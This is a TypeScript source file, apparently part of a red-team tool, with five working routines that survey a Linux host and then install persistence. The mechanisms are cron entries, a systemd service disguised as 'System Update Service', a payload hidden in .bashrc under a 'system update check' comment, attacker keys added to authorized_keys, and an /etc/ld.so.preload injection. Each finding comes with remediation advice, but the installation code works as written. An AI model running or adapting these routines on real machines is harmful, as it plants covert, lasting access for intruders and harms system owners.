import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function cronPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Cron Persistence ==="]
  const payload = argVal(args, "--payload")
  const schedule = argVal(args, "--schedule") || "*/5 * * * *"

  const script = `
echo "--- Current Cron Jobs ---"
crontab -l 2>/dev/null && echo "[*] User crontab exists" || echo "[-] No user crontab"
echo ""
echo "--- System Cron ---"
ls -la /etc/cron.d/ 2>/dev/null
echo ""
echo "--- Cron Directories ---"
for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
  if [ -d "$d" ]; then
    count=$(ls -1 "$d" 2>/dev/null | wc -l)
    writable=$([ -w "$d" ] && echo "WRITABLE" || echo "read-only")
    echo "$d: $count scripts ($writable)"
  fi
done
echo ""
echo "--- /etc/crontab ---"
cat /etc/crontab 2>/dev/null
echo ""
${payload ? `
echo "--- Installing Cron Persistence ---"
if [ -w /etc/cron.d/ ]; then
  echo "${schedule} root ${payload}" > /etc/cron.d/cs_persist 2>/dev/null && echo "[+] Written to /etc/cron.d/cs_persist" || echo "[-] Failed to write to /etc/cron.d/"
elif command -v crontab >/dev/null 2>&1; then
  (crontab -l 2>/dev/null; echo "${schedule} ${payload}") | crontab - 2>/dev/null && echo "[+] Added to user crontab" || echo "[-] Failed to add to user crontab"
else
  echo "[-] No writable cron location found"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --schedule for timing (default: */5 * * * *)"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+]")) {
    findings.push({
      checkId: "LNX-CRONP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "cron",
      title: "Cron persistence installed",
      details: `Cron job persistence established with schedule: ${schedule}`,
      remediation: "Audit crontab, /etc/cron.d/, and cron.{hourly,daily,weekly,monthly} directories. Remove unauthorized entries.",
    })
  }

  const writable = (r.stdout.match(/WRITABLE/g) || []).length
  if (writable > 0) {
    findings.push({
      checkId: "LNX-CRONP-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "cron_dirs",
      title: "Writable cron directories found",
      details: `${writable} cron directory/directories are writable — persistence can be established`,
      remediation: "Restrict cron directory permissions to root only (755 with root ownership).",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function systemdPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Systemd Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "cs-update"
  const userLevel = hasFlag(args, "--user")

  const script = `
echo "--- Init System Check ---"
if [ -d /run/systemd/system ]; then
  echo "[+] systemd is the init system"
else
  echo "[-] systemd is NOT running — this persistence method will not work"
  exit 1
fi
echo ""
echo "--- Existing Custom Services ---"
${userLevel ? `
ls -la ~/.config/systemd/user/ 2>/dev/null || echo "[-] No user services directory"
systemctl --user list-units --type=service --no-pager 2>/dev/null | head -20
` : `
find /etc/systemd/system/ -maxdepth 1 -name "*.service" -newer /etc/systemd/system 2>/dev/null | head -20
systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -30
`}
echo ""
${payload ? `
echo "--- Installing Systemd Persistence ---"
${userLevel ? `
mkdir -p ~/.config/systemd/user 2>/dev/null
cat > ~/.config/systemd/user/${name}.service << 'UNIT'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${payload}
Restart=on-failure
RestartSec=60

[Install]
WantedBy=default.target
UNIT
systemctl --user daemon-reload 2>/dev/null
systemctl --user enable ${name}.service 2>/dev/null && echo "[+] User service enabled: ${name}.service" || echo "[-] Failed to enable user service"
systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service started" || echo "[-] Failed to start user service"
` : `
cat > /etc/systemd/system/${name}.service << 'UNIT'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${payload}
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload 2>/dev/null
systemctl enable ${name}.service 2>/dev/null && echo "[+] Service enabled: ${name}.service" || echo "[-] Failed to enable service"
systemctl start ${name}.service 2>/dev/null && echo "[+] Service started" || echo "[-] Failed to start service"
`}
` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install. Add --user for user-level service."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Service enabled") || r.stdout.includes("[+] User service enabled")) {
    findings.push({
      checkId: "LNX-SYSDP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `systemd/${name}.service`,
      title: `Systemd ${userLevel ? "user " : ""}service persistence installed`,
      details: `Service ${name}.service created and enabled${userLevel ? " at user level (no root needed)" : " at system level"}. Restarts on failure with 60s delay.`,
      remediation: `Remove with: systemctl ${userLevel ? "--user " : ""}disable --now ${name}.service && rm ${userLevel ? "~/.config/systemd/user" : "/etc/systemd/system"}/${name}.service`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function bashrcPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Bashrc/Profile Persistence ==="]
  const payload = argVal(args, "--payload")
  const targetUser = argVal(args, "--target-user")

  const script = `
echo "--- Shell RC Files ---"
for dir in /root /home/*; do
  user=$(basename "$dir")
  if [ -d "$dir" ]; then
    for rc in .bashrc .bash_profile .profile .zshrc .zprofile; do
      if [ -f "$dir/$rc" ]; then
        writable=$([ -w "$dir/$rc" ] && echo "WRITABLE" || echo "read-only")
        echo "  $dir/$rc ($writable)"
      fi
    done
  fi
done
echo ""
echo "--- Global Profiles ---"
for f in /etc/profile /etc/bash.bashrc /etc/profile.d/*.sh; do
  if [ -f "$f" ]; then
    writable=$([ -w "$f" ] && echo "WRITABLE" || echo "read-only")
    echo "  $f ($writable)"
  fi
done
echo ""
${payload ? `
echo "--- Installing Bashrc Persistence ---"
target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
for rc in "$target_dir/.bashrc" "$target_dir/.profile"; do
  if [ -f "$rc" ] && [ -w "$rc" ]; then
    echo "" >> "$rc"
    echo "# system update check" >> "$rc"
    echo "${payload} &>/dev/null &" >> "$rc"
    echo "[+] Payload appended to $rc"
    break
  fi
done
` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --target-user <user> to target specific user."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const writableRcs = (r.stdout.match(/WRITABLE/g) || []).length
  if (writableRcs > 0) {
    findings.push({
      checkId: "LNX-BASHRC-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "shell_rc",
      title: "Writable shell RC files found",
      details: `${writableRcs} writable shell RC file(s) available for persistence injection`,
      remediation: "Monitor shell RC files for unauthorized modifications. Use file integrity monitoring (AIDE/Tripwire).",
    })
  }

  if (r.stdout.includes("[+] Payload appended")) {
    findings.push({
      checkId: "LNX-BASHRC-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "shell_rc",
      title: "Shell RC persistence installed",
      details: "Payload appended to shell RC file — executes on every interactive shell login",
      remediation: "Review .bashrc, .profile, .bash_profile, .zshrc for unauthorized entries. Remove injected lines.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sshAuthorizedKeys(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SSH Authorized Keys Persistence ==="]
  const pubkey = argVal(args, "--pubkey")
  const targetUser = argVal(args, "--target-user")

  const script = `
echo "--- Existing Authorized Keys ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/authorized_keys" ]; then
    count=$(wc -l < "$dir/.ssh/authorized_keys" 2>/dev/null)
    writable=$([ -w "$dir/.ssh/authorized_keys" ] && echo "WRITABLE" || echo "read-only")
    echo "  $dir/.ssh/authorized_keys: $count key(s) ($writable)"
  elif [ -d "$dir" ]; then
    sshdir_writable=$([ -w "$dir" ] && echo "home-writable" || echo "home-read-only")
    echo "  $dir: no authorized_keys ($sshdir_writable)"
  fi
done
echo ""
echo "--- SSHD Config ---"
grep -iE "^(AuthorizedKeysFile|PermitRootLogin|PubkeyAuthentication|PasswordAuthentication)" /etc/ssh/sshd_config 2>/dev/null
echo ""
${pubkey ? `
echo "--- Installing SSH Key Persistence ---"
target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
mkdir -p "$target_dir/.ssh" 2>/dev/null
chmod 700 "$target_dir/.ssh" 2>/dev/null
echo "${pubkey}" >> "$target_dir/.ssh/authorized_keys" 2>/dev/null && echo "[+] Key added to $target_dir/.ssh/authorized_keys" || echo "[-] Failed to write authorized_keys"
chmod 600 "$target_dir/.ssh/authorized_keys" 2>/dev/null
` : `echo "[*] Dry run — pass --pubkey <ssh-rsa ...> to install. Use --target-user <user> to target."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Key added")) {
    findings.push({
      checkId: "LNX-AUTHKEYS-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "ssh_authorized_keys",
      title: "SSH authorized_keys persistence installed",
      details: "SSH public key added to authorized_keys — passwordless SSH access established",
      remediation: "Audit authorized_keys files for all users. Remove unauthorized keys. Consider using AuthorizedKeysCommand for centralized management.",
    })
  }

  const writableHomes = (r.stdout.match(/home-writable/g) || []).length
  if (writableHomes > 0) {
    findings.push({
      checkId: "LNX-AUTHKEYS-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "ssh_authorized_keys",
      title: "Writable home directories without SSH keys",
      details: `${writableHomes} user home(s) are writable and have no authorized_keys — SSH key persistence possible`,
      remediation: "Restrict home directory permissions. Monitor authorized_keys file changes.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function ldSoPreload(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== ld.so.preload Persistence ==="]
  const libPath = argVal(args, "--library-path")

  const script = `
echo "--- /etc/ld.so.preload Status ---"
if [ -f /etc/ld.so.preload ]; then
  echo "[!] /etc/ld.so.preload EXISTS:"
  cat /etc/ld.so.preload
  echo ""
  echo "Permissions:"
  ls -la /etc/ld.so.preload
else
  echo "[-] /etc/ld.so.preload does not exist"
  writable=$([ -w /etc/ ] && echo "WRITABLE" || echo "read-only")
  echo "/etc/ is $writable"
fi
echo ""
echo "--- Current ld.so.conf.d entries ---"
ls -la /etc/ld.so.conf.d/ 2>/dev/null
echo ""
echo "--- Shared library cache ---"
ldconfig -p 2>/dev/null | wc -l
echo ""
${libPath ? `
echo "--- Installing ld.so.preload Persistence ---"
if [ "$(id -u)" = "0" ]; then
  echo "${libPath}" >> /etc/ld.so.preload && echo "[+] Library added to /etc/ld.so.preload: ${libPath}" || echo "[-] Failed to write /etc/ld.so.preload"
else
  echo "[-] Root required for /etc/ld.so.preload modification"
fi
` : `echo "[*] Dry run — pass --library-path /path/to/lib.so to install. REQUIRES ROOT."
echo "[*] WARNING: Every dynamically linked process will load this library"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Library added")) {
    findings.push({
      checkId: "LNX-LDSOPRELOAD-001",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "INSTALLED",
      resource: "/etc/ld.so.preload",
      title: "ld.so.preload persistence installed",
      details: `Library ${libPath} added to /etc/ld.so.preload — loaded into every dynamically linked process on the system`,
      remediation: "Remove entry from /etc/ld.so.preload. Delete the malicious shared library. Run ldconfig.",
    })
  }

  if (r.stdout.includes("ld.so.preload EXISTS")) {
    findings.push({
      checkId: "LNX-LDSOPRELOAD-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "/etc/ld.so.preload",
      title: "ld.so.preload file already exists",
      details: "An existing /etc/ld.so.preload was found — may indicate existing compromise or legitimate use",
      remediation: "Audit /etc/ld.so.preload contents. Verify all listed libraries are legitimate.",
    })
  }

  return { output: output.join("\n"), findings }
}
